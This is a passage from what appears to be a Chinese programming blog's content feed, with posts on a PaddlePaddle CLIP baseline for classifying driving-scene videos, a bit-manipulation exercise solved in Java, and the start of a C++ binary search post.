punctuation">.</span>cvtColor<span class="token punctuation">(</span>img<span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>COLOR_BGR2RGB<span class="token punctuation">)</span>    image <span class="token operator">=</span> Image<span class="token punctuation">.</span>fromarray<span class="token punctuation">(</span>image<span class="token punctuation">)</span>    image <span class="token operator">=</span> transforms<span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">.</span>unsqueeze<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    single_video_result <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"clip_id"</span><span class="token punctuation">:</span> clip_id<span class="token punctuation">,</span>        <span class="token string">"scerario"</span> <span class="token punctuation">:</span> <span class="token string">"cityroad"</span><span class="token punctuation">,</span>        <span class="token string">"weather"</span><span class="token punctuation">:</span><span class="token string">"unknown"</span><span class="token punctuation">,</span>        <span class="token string">"period"</span><span class="token punctuation">:</span><span class="token string">"night"</span><span class="token punctuation">,</span>        <span class="token string">"road_structure"</span><span class="token punctuation">:</span><span class="token string">"ramp"</span><span class="token punctuation">,</span>        <span class="token string">"general_obstacle"</span><span class="token punctuation">:</span><span class="token string">"nothing"</span><span class="token punctuation">,</span>        <span class="token string">"abnormal_condition"</span><span class="token punctuation">:</span><span class="token string">"nothing"</span><span class="token punctuation">,</span>        <span class="token string">"ego_car_behavior"</span><span class="token punctuation">:</span><span class="token string">"turning right"</span><span class="token punctuation">,</span>        <span class="token string">"closest_participants_type"</span><span class="token punctuation">:</span><span class="token string">"passenger car"</span><span class="token punctuation">,</span>        <span class="token string">"closest_participants_behavior"</span><span class="token punctuation">:</span><span class="token string">"braking"</span>    <span class="token punctuation">}</span>        <span class="token keyword">for</span> keyword <span class="token keyword">in</span> en_match_words<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> keyword <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"weather"</span><span class="token punctuation">,</span> <span class="token string">"road_structure"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>                    texts <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>en_match_words<span class="token punctuation">[</span>keyword<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> paddle<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            logits_per_image<span class="token punctuation">,</span> logits_per_text <span class="token operator">=</span> model<span class="token punctuation">(</span>image<span class="token punctuation">,</span> tokenize<span class="token punctuation">(</span>en_match_words<span class="token punctuation">[</span>keyword<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            probs <span class="token operator">=</span> paddle<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>functional<span class="token punctuation">.</span>softmax<span class="token punctuation">(</span>logits_per_image<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        probs <span class="token operator">=</span> probs<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span>                single_video_result<span class="token punctuation">[</span>keyword<span class="token punctuation">]</span> <span class="token operator">=</span> texts<span class="token punctuation">[</span>probs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>argsort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            submit_json<span class="token punctuation">[</span><span class="token string">"test_results"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>single_video_result<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'clip_result.json'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> up<span class="token punctuation">:</span>    json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>submit_json<span class="token punctuation">,</span> up<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="读懂baseline"><a href="#读懂baseline" class="headerlink" title="读懂baseline"></a>读懂baseline</h3><p>导入必要的库</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> paddle<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> clip <span class="token keyword">import</span> tokenize<span class="token punctuation">,</span> load_model<span class="token keyword">import</span> glob<span class="token punctuation">,</span> json<span class="token punctuation">,</span> os<span class="token keyword">import</span> cv2<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm_notebook <span class="token comment">#可视化</span><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>preprocessing <span class="token keyword">import</span> normalize<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加载预训练模型</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">model<span class="token punctuation">,</span> transforms <span class="token operator">=</span> load_model<span class="token punctuation">(</span><span class="token string">'ViT_B_32'</span><span class="token punctuation">,</span> pretrained<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建字典变量用于输入文本信息</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">en_match_words <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"scerario"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"suburbs"</span><span class="token punctuation">,</span><span class="token string">"city street"</span><span class="token punctuation">,</span><span class="token string">"expressway"</span><span class="token punctuation">,</span><span class="token string">"tunnel"</span><span class="token punctuation">,</span><span class="token string">"parking-lot"</span><span class="token punctuation">,</span><span class="token string">"gas or charging stations"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"weather"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"clear"</span><span class="token punctuation">,</span><span class="token string">"cloudy"</span><span class="token punctuation">,</span><span class="token string">"raining"</span><span class="token punctuation">,</span><span class="token string">"foggy"</span><span class="token punctuation">,</span><span class="token string">"snowy"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"period"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"daytime"</span><span class="token punctuation">,</span><span class="token string">"dawn or dusk"</span><span class="token punctuation">,</span><span class="token string">"night"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"road_structure"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"normal"</span><span class="token punctuation">,</span><span class="token string">"crossroads"</span><span class="token punctuation">,</span><span class="token string">"T-junction"</span><span class="token punctuation">,</span><span class="token string">"ramp"</span><span class="token punctuation">,</span><span class="token string">"lane merging"</span><span class="token punctuation">,</span><span class="token string">"parking lot entrance"</span><span class="token punctuation">,</span><span class="token string">"round about"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"general_obstacle"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"nothing"</span><span class="token punctuation">,</span><span class="token string">"speed bumper"</span><span class="token punctuation">,</span><span class="token string">"traffic cone"</span><span class="token punctuation">,</span><span class="token string">"water horse"</span><span class="token punctuation">,</span><span class="token string">"stone"</span><span class="token punctuation">,</span><span class="token string">"manhole cover"</span><span class="token punctuation">,</span><span class="token string">"nothing"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"abnormal_condition"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"uneven"</span><span class="token punctuation">,</span><span class="token string">"oil or water stain"</span><span class="token punctuation">,</span><span class="token string">"standing water"</span><span class="token punctuation">,</span><span class="token string">"cracked"</span><span class="token punctuation">,</span><span class="token string">"nothing"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"ego_car_behavior"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"slow down"</span><span class="token punctuation">,</span><span class="token string">"go straight"</span><span class="token punctuation">,</span><span class="token string">"turn right"</span><span class="token punctuation">,</span><span class="token string">"turn left"</span><span class="token punctuation">,</span><span class="token string">"stop"</span><span class="token punctuation">,</span><span class="token string">"U-turn"</span><span class="token punctuation">,</span><span class="token string">"speed up"</span><span class="token punctuation">,</span><span class="token string">"lane change"</span><span class="token punctuation">,</span><span class="token string">"others"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"closest_participants_type"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"passenger car"</span><span class="token punctuation">,</span><span class="token string">"bus"</span><span class="token punctuation">,</span><span class="token string">"truck"</span><span class="token punctuation">,</span><span class="token string">"pedestrain"</span><span class="token punctuation">,</span><span class="token string">"policeman"</span><span class="token punctuation">,</span><span class="token string">"nothing"</span><span class="token punctuation">,</span><span class="token string">"others"</span><span class="token punctuation">,</span><span class="token string">"unknown"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"closest_participants_behavior"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"slow down"</span><span class="token punctuation">,</span><span class="token string">"go straight"</span><span class="token punctuation">,</span><span class="token string">"turn right"</span><span class="token punctuation">,</span><span class="token string">"turn left"</span><span class="token punctuation">,</span><span class="token string">"stop"</span><span class="token punctuation">,</span><span class="token string">"U-turn"</span><span class="token punctuation">,</span><span class="token string">"speed up"</span><span class="token punctuation">,</span><span class="token string">"lane change"</span><span class="token punctuation">,</span><span class="token string">"others"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定义输出json文件的基本内容的字典</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">submit_json <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"author"</span> <span class="token punctuation">:</span> <span class="token string">"abc"</span> <span class="token punctuation">,</span>    <span class="token string">"time"</span> <span class="token punctuation">:</span> <span class="token string">"231011"</span><span class="token punctuation">,</span>    <span class="token string">"model"</span> <span class="token punctuation">:</span> <span class="token string">"model_name"</span><span class="token punctuation">,</span>    <span class="token string">"test_results"</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取视频地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">paths <span class="token operator">=</span> glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">'./初赛测试视频/*'</span><span class="token punctuation">)</span>paths<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来核心部分是一个循环，对给定的视频路径列表进行迭代，并依次处理每个视频。</p><p>具体分析内容在注释部分</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> video_path <span class="token keyword">in</span> paths<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>video_path<span class="token punctuation">)</span>        clip_id <span class="token operator">=</span> video_path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment">#使用`split()`方法和`'/'`作为分隔符将视频路径分割为多个部分，并选择最后一个部分作为`clip_id`（视频片段ID）</span>    cap <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span>video_path<span class="token punctuation">)</span><span class="token comment">#使用OpenCV的`cv2.VideoCapture()`函数打开视频文件</span>    img <span class="token operator">=</span> cap<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment">#读取视频的一帧图像，并将其保存在`img`变量中</span>    image <span class="token operator">=</span> cv2<span class="token punctuation">.</span>cvtColor<span class="token punctuation">(</span>img<span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>COLOR_BGR2RGB<span class="token punctuation">)</span><span class="token comment">#将图像从BGR颜色空间转换为RGB颜色空间。</span>    image <span class="token operator">=</span> Image<span class="token punctuation">.</span>fromarray<span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token comment">#将图像数据转换为PIL图像对象</span>    image <span class="token operator">=</span> transforms<span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">.</span>unsqueeze<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#添加一个维度，以符合模型的输入要求(张量)</span>        <span class="token comment">#用于存储视频处理的结果</span>    single_video_result <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"clip_id"</span><span class="token punctuation">:</span> clip_id<span class="token punctuation">,</span>        <span class="token string">"scerario"</span> <span class="token punctuation">:</span> <span class="token string">"cityroad"</span><span class="token punctuation">,</span>        <span class="token string">"weather"</span><span class="token punctuation">:</span><span class="token string">"unknown"</span><span class="token punctuation">,</span>        <span class="token string">"period"</span><span class="token punctuation">:</span><span class="token string">"night"</span><span class="token punctuation">,</span>        <span class="token string">"road_structure"</span><span class="token punctuation">:</span><span class="token string">"ramp"</span><span class="token punctuation">,</span>        <span class="token string">"general_obstacle"</span><span class="token punctuation">:</span><span class="token string">"nothing"</span><span class="token punctuation">,</span>        <span class="token string">"abnormal_condition"</span><span class="token punctuation">:</span><span class="token string">"nothing"</span><span class="token punctuation">,</span>        <span class="token string">"ego_car_behavior"</span><span class="token punctuation">:</span><span class="token string">"turning right"</span><span class="token punctuation">,</span>        <span class="token string">"closest_participants_type"</span><span class="token punctuation">:</span><span class="token string">"passenger car"</span><span class="token punctuation">,</span>        <span class="token string">"closest_participants_behavior"</span><span class="token punctuation">:</span><span class="token string">"braking"</span>    <span class="token punctuation">}</span>        <span class="token keyword">for</span> keyword <span class="token keyword">in</span> en_match_words<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> keyword <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"weather"</span><span class="token punctuation">,</span> <span class="token string">"road_structure"</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token comment">#只处理天气和时间段（其它效果不行）</span>            <span class="token keyword">continue</span>                    texts <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>en_match_words<span class="token punctuation">[</span>keyword<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#关键字对应的文本列表转换为NumPy数组</span>        <span class="token keyword">with</span> paddle<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            logits_per_image<span class="token punctuation">,</span> logits_per_text <span class="token operator">=</span> model<span class="token punctuation">(</span>image<span class="token punctuation">,</span> tokenize<span class="token punctuation">(</span>en_match_words<span class="token punctuation">[</span>keyword<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#模型对图像和文本进行推断</span>            probs <span class="token operator">=</span> paddle<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>functional<span class="token punctuation">.</span>softmax<span class="token punctuation">(</span>logits_per_image<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#得到每个类别的概率分布</span>        probs <span class="token operator">=</span> probs<span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#概率分布转换为NumPy数组     </span>        <span class="token comment">#argsort()获得升序索引，[::-1]进行降序排序，[0]获得最大值的索引</span>        <span class="token comment">#选择概率最高的类别对应的文本</span>        single_video_result<span class="token punctuation">[</span>keyword<span class="token punctuation">]</span> <span class="token operator">=</span> texts<span class="token punctuation">[</span>probs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>argsort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            submit_json<span class="token punctuation">[</span><span class="token string">"test_results"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>single_video_result<span class="token punctuation">)</span><span class="token comment">#推理结果添加</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后结果写入clip_result.json</p><p>‘w’写入模式，并指定编码encoding为UTF-8,不会进行ASCII编码ensure_ascii=False（即确保写入的文件中可以包含非ASCII字符）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'clip_result.json'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> up<span class="token punctuation">:</span>    json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>submit_json<span class="token punctuation">,</span> up<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="提分-df-思路"><a href="#提分-df-思路" class="headerlink" title="提分(df)思路"></a>提分(df)思路</h2><p>对视频每秒取5帧，而不是只取一帧</p><p>更换模型ViT-L/14</p><p>换成COLOR_BGR2GRAY</p><p>输入文本的描述语言，而不是输入描述性单词，eg：”unknown”改为输入“In the parking lot, there’s no way to know if it’s day or night”</p><p>太菜了想不出来了….</p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> clip </tag>
            
            <tag> DL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>位运算</title>
      <link href="/2023/11/01/wei-yun-suan/"/>
      <url>/2023/11/01/wei-yun-suan/</url>
      
        <content type="html"><![CDATA[<h3 id="原题"><a href="#原题" class="headerlink" title="原题"></a>原题</h3><p>给定一个长度为 n 的数列，请你求出数列中每个数的二进制表示中 11 的个数。</p><h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行包含整数 n。</p><p>第二行包含 n个整数，表示整个数列。</p><h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>共一行，包含 n 个整数，其中的第 i个数表示数列中的第 i个数的二进制表示中 11 的个数。</p><h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤n≤100000,<br>0≤数列中元素的值≤109</p><h4 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h4><pre class="line-numbers language-none"><code class="language-none">51 2 3 4 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h4><pre class="line-numbers language-none"><code class="language-none">1 1 2 1 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="我的题解："><a href="#我的题解：" class="headerlink" title="我的题解："></a>我的题解：</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">Scanner</span> sc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">--</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> num <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>num <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                num <span class="token operator">&amp;=</span> num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 易证可以消去最低位1</span>                                <span class="token comment">//或者lowbit(X)也可以，比如x -= lowbit(X), lowbit(x) = x &amp; -x(运用补码)</span>                ans <span class="token operator">++</span><span class="token punctuation">;</span>         <span class="token comment">//lowbit()输出只保留输入参数的最低位1的二进制数</span>            <span class="token punctuation">}</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span>ans<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">/*while(n -- &gt; 0)        {            int num = sc.nextInt();            int ans = 0;            while(num != 0)            {                if (num % 2 == 1) ans ++;                num = num / 2;            }            System.out.printf("%d ",ans);        }*/</span>  <span class="token comment">//暴力</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="其它位运算例题"><a href="#其它位运算例题" class="headerlink" title="其它位运算例题"></a>其它位运算例题</h3><p><img src="/2023/11/01/wei-yun-suan/image-20231101221235057.png"></p><p>判断是否为2的幂次方显然可以利用二进制位运算，规律发现2的幂次方只有一位为1，其余位均为0.故可以通过 <code>x &amp; -x == x</code>该运算判断（利用补码进行&amp;运算可以求得只保留该数最低位的1，其余均变为0，故可以利用这个运算后是否还等于自己本身来判断）注目：x&lt;0的情况也要讨论一下，是不可能为2的幂次方。</p><p><img src="/2023/11/01/wei-yun-suan/image-20231101222003667.png"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.acwing.com/problem/content/803/">原题链接</a></p><p><a href="https://www.bilibili.com/video/BV1BG41127eU/?spm_id_from=333.999.0.0&amp;vd_source=6fb2d8618426a162edd6fcdb1c92b705">参考视频</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二分(算法)</title>
      <link href="/2023/10/23/er-fen-suan-fa/"/>
      <url>/2023/10/23/er-fen-suan-fa/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.acwing.com/problem/content/791/">原题</a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>注意：如果写之前不考虑好想要查找的是什么，十有八九会是死循环或者查找错误，就算侥幸写对了也只是运气好而已！！！</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">1e5</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>q<span class="token punctuation">,</span>qq<span class="token punctuation">;</span><span class="token keyword">int</span> num<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> n <span class="token operator">&gt;&gt;</span> q<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cin <span class="token operator">&gt;&gt;</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">//cout &lt;&lt; num[i];</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> q<span class="token punctuation">;</span> i <span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cin <span class="token operator">&gt;&gt;</span> qq<span class="token punctuation">;</span>        <span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> r <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//此处定义说明将查找的空间定为左闭右闭，与下面作对比</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;</span> r<span class="token punctuation">)</span>         <span class="token punctuation">{</span>            <span class="token keyword">int</span> mid <span class="token operator">=</span> l <span class="token operator">+</span> r <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;</span> qq<span class="token punctuation">)</span> l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> r <span class="token operator">=</span> mid<span class="token punctuation">;</span>            <span class="token comment">//cout &lt;&lt; l;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>num<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">!=</span> qq<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-1 -1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> l1 <span class="token operator">=</span> l<span class="token punctuation">,</span> r1 <span class="token operator">=</span> n<span class="token punctuation">;</span><span class="token comment">//此处定义说明将查找的空间定为左闭右开</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>l1 <span 